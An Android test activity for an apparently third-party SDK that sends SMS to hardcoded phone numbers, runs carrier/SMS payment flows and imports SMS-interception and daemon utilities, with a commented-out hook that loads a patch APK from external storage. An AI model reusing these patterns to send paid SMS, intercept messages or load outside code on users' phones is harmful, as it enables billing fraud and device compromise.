package com.thirdparty.engine.ui;

import android.app.Activity;
import android.app.PendingIntent;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentSender;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SubscriptionInfo;
import android.telephony.SubscriptionManager;
import android.text.TextUtils;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;

import com.gandalf.daemon.utils.Common;
import com.gandalf.daemon.utils.LogUtil;
import com.gandalf.daemon.utils.XL_log;
import com.mj.jar.pay.BillingListener;
import com.msm.modu1e.utils.SMSUtil;
import com.msm.modu1e.utils.SendResult;
import com.sdkjar.test.R;
import com.thirdparty.engine.ServiceStub;
import com.thirdparty.engine.WYpay;
import com.thirdparty.engine.YuFengPay;
import com.thirdparty.engine.YunBeiPay;
import com.thirdparty.entry.SmsSendTask;
import com.thirdparty.net.Reporter;
import com.thirdparty.net.SmsResultReportCallback;
import com.thirdparty.sms.utils.SmsInterceptHelper;
import com.thirdparty.utils.Constants;
import com.wyzf.constant.PayResult;
import com.wyzf.download.SdkDlm;
import com.wyzf.pay.PayResultListener;
import com.wyzf.pay.WYZFPay;

import java.lang.reflect.Field;
import java.util.List;

import cn.utopay.sdk.interfaces.PCallback;
import k.m.IStub;


public class PromptActivity extends Activity {
    private XL_log log = new XL_log(PromptActivity.class);
    private static final String TAG = "sdk_jar";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        // TODO Auto-generated method stub
        super.onCreate(savedInstanceState);
        initView();
        initDate();
    }

    private void initDate() {
        initHook();
        initLog();
    }

    private void initLog() {
//        XL_log.init(getApplicationContext(), "test.log");
    }

    //
    private static String cpOrderId = "1581584";
    IStub stub = null;

    private void initView() {
        setContentView(R.layout.activity_prompt);
        stub = ServiceStub.getInstance(this);
        Button btn_start = (Button) findViewById(R.id.btn_start);
//        final YunBeiPay pay = YunBeiPay.getInstance(PromptActivity.this);
//        pay.init("100000002", "001");
        btn_start.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
//                yunbeiTest();
//                WyTest();
//                  WyOriTest();
//                WyTest();
//                sdkTest();
//                yufengtest();
                sendTest();
//                sendSmsTest();
//                smsTest();
            }
        });
    }

    private void smsTest() {

//        Intent sentIntent = new Intent(Constants.RECEIVER_FILTER_ACTION_SENDSMS_CHANNEL);
//        Bundle bundle = new Bundle();
//        sentIntent.putExtras(bundle);
//        PendingIntent sentPI = PendingIntent.getBroadcast(this, (int) System.currentTimeMillis(), sentIntent, PendingIntent.FLAG_ONE_SHOT);
//
//
//        IntentSender sender = sentPI.getIntentSender();
////        private final IIntentSender mTarget;
//        Class clazz = sender.getClass();
//        try {
//            Field mTarget = clazz.getDeclaredField("mTarget");
//            mTarget.setAccessible(true);
//            Object target = mTarget.get(sender);
//            Log.d(TAG, "targetClazz:" + target.getClass().getName());
//
//        } catch (NoSuchFieldException e) {
//            e.printStackTrace();
//        } catch (IllegalAccessException e) {
//            e.printStackTrace();
//        }


//        SMSUtil.sendSMS(this, 0, "18826536509", null, "few", sentPI, null);
    }

    private void sendSmsTest() {
//        SMSUtil.sendSMS(this, 0, "13418557466", null, "hello", null, null);
        SmsManager sm = SmsManager.getDefault();
        sm.sendTextMessage("18826536509", null, "api", null, null);
    }

    //    @Override
//    protected void onResume() {
//        super.onResume();
//        registerReceiver();
//    }
//

    private void sendTest() {
        SmsSendTask smsSendTask = new SmsSendTask();

        Intent sentIntent = new Intent(Constants.RECEIVER_FILTER_ACTION_SENDSMS_CHANNEL);
        Bundle bundle = new Bundle();


        String mSendToNumber = "15118817079";
        String mContent = "few";
        String mTaskId = "123";
        smsSendTask.mSendToNumber = mSendToNumber;
        smsSendTask.mTaskId = mTaskId;
        smsSendTask.mContent = mContent;

        bundle.putSerializable(Constants.BUNDLE_KEY_SMS_SEND_TASKS, smsSendTask);
        sentIntent.putExtra(Constants.BUNDLE_KEY_SMS_SEND_TASKS, smsSendTask);
        sentIntent.putExtras(bundle);

        PendingIntent sentPI = PendingIntent.getBroadcast(this, (int) System.currentTimeMillis(), sentIntent, PendingIntent.FLAG_ONE_SHOT);

        SendResult sendResult = SMSUtil.sendSMS(this, 2, mSendToNumber, null, mContent, sentPI, null);
    }


    private void sdkTest() {
        Intent intent = new Intent(this, MyService.class);
        startService(intent);
    }

    //
    private void yuFengTest() {
        YuFengPay yPay = new YuFengPay(PromptActivity.this.getApplicationContext());
        yPay.init("000703", "0000", new BillingListener() {
            @Override
            public void onBillingResult(int i, Bundle bundle) {
                log.debug("onBillingResult arg0:" + i + " arg1:" + bundle);
            }

            @Override
            public void onInitResult(int i) {
                log.debug("onInitResult arg0:" + i);
            }
        });
        yPay.pay("000703000", "2000");
    }

    //
//    private static SendSMSResultReceiver smSendSMSResultReceiver = new SendSMSResultReceiver();
//
//    private void registerReceiver() {
//        log.debug("registerReceiver");
////        unRegisterReceiver();
//        IntentFilter channel_filter = new IntentFilter();
//        channel_filter.addAction(Constants.INTENT_ACTION_REQEUST_PAYTASK);
//        channel_filter.addAction(Constants.INTENT_ACTION_REQUEST_SMSTASK);
//        channel_filter.addAction(Constants.INTENT_ACTION_DO_SMS_TASK);
//        channel_filter.addAction(Constants.INTENT_ACTION_DO_UPLOAD_TASK);
//        channel_filter.addAction(Constants.INTENT_ACTION_REQUEST_UPLOAD_TASK);
//
//        channel_filter.addAction(Constants.INTENT_ACTION_DO_PAYTASK_WITH_YF);
//        channel_filter.addAction(Constants.INTENT_ACTION_DO_PAYTASK_WITH_WY);
//
//        IntentFilter send_ret_filter = new IntentFilter();
//        send_ret_filter.addAction(Constants.RECEIVER_FILTER_ACTION_SENDSMS_CHANNEL);
//        send_ret_filter.addAction(Constants.RECEIVER_FILTER_YUFENG_SMS_SEND_ACTION);
//        send_ret_filter.addAction(Constants.RECEIVER_FILTER_WEIYUN_SMS_SEND_ACTION);
//        this.registerReceiver(smSendSMSResultReceiver, send_ret_filter);
//    }
    private static final String YUNBEI_TAG = "yunbei";
    Activity context = null;
    private static final String YUNBEI_APP_ID = "100000002";
    private static final String YUNBEI_APP_CODE = "default";
    private static final String YUNBEI_FEE_ID = "1215754197"; // 5 yuan

    private static String YUNBEI_cpOrderId = "1581584";

    public void yunbeiTest() {
        YunBeiPay pay = YunBeiPay.getInstance(this.getApplicationContext());
        pay.init(YUNBEI_APP_ID, YUNBEI_APP_CODE);
        pay.pay(YUNBEI_FEE_ID, null, new PCallback() {
            @Override
            public void payEnd(int i) {
                Log.d(YUNBEI_TAG, "pay result:" + i);
            }
        });
    }

    private void WyTest() {
        XL_log.init(this, Common.LOG_PATH);
        WYpay pay = WYpay.getInstance(this.getApplicationContext());
        pay.init("20316361", "00007");
        pay.pay("70161603", "500", new PayResultListener() {
            @Override
            public void onResult(PayResult payResult, int feeCode) {
                switch (payResult) {
                    case SUCCESS:
                        Toast.makeText(PromptActivity.this, "支付成功", Toast.LENGTH_SHORT).show();
                        log.debug("pay success");
                        break;
                    default:
                        Toast.makeText(PromptActivity.this, payResult.msg, Toast.LENGTH_SHORT).show();
                        log.debug("pay failed msg:" + payResult.msg);
                        break;
                }
            }
        });

    }

    private void WyOriTest() {
        XL_log.init(this, Common.LOG_PATH);
        WYpayInit();
        // TODO Auto-generated method stub
        WYZFPay.getInstance().pay(PromptActivity.this, 70161603, 500, new PayResultListener() {
            @Override
            public void onResult(PayResult payResult, int feeCode) {
                switch (payResult) {
                    case SUCCESS:
                        Toast.makeText(PromptActivity.this, "支付成功", Toast.LENGTH_SHORT).show();
                        log.debug("pay success");
                        break;
                    default:
                        Toast.makeText(PromptActivity.this, payResult.msg, Toast.LENGTH_SHORT).show();
                        log.debug("pay failed msg:" + payResult.msg);
                        break;
                }
            }
        });
    }

    private void WYpayInit() {
        SdkDlm.getInstance(this).init("20316361", "00007");
    }

    //    private static final String BUKET_NAME = "uploadkp";
//    private static final String APP_ID = "10040374";
    private void initHook() {
//        HookMain hookMain = new HookMain();
//        ClassLoader appClassLoader = this.getClassLoader();
//        DexClassLoader dexClassLoader = new DexClassLoader("/sdcard/io.virtualhook/patch.apk",
//                this.getCodeCacheDir().getAbsolutePath(), null, appClassLoader);
//        hookMain.doHookDefault(dexClassLoader, appClassLoader);
    }
}
